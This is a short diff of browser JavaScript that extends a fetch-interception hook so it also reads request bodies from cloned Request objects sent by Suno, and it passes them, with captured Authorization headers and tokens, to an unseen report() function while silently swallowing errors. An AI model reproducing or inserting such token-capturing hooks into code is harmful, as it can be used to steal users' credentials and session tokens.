@@ -139,7 +139,30 @@
           if (!auth && input && typeof input === "object" && input.headers) {
             auth = findAuthHeader(input.headers);
           }
-          report(url, method, body, auth);
+          if (body !== undefined && body !== null) {
+            report(url, method, body, auth);
+          } else if (
+            input &&
+            typeof input === "object" &&
+            typeof input.clone === "function"
+          ) {
+            // Suno sends fetch(new Request(url, { body, headers })): the token
+            // lives on the Request object, not init.body. Read it async from a
+            // clone so we never disturb the real request stream.
+            try {
+              input
+                .clone()
+                .text()
+                .then(
+                  function (text) {
+                    report(url, method, text, auth);
+                  },
+                  function () {}
+                );
+            } catch (e) {}
+          } else {
+            report(url, method, body, auth);
+          }
         } catch (e) {
           // Observation only — swallow and fall through.
         }
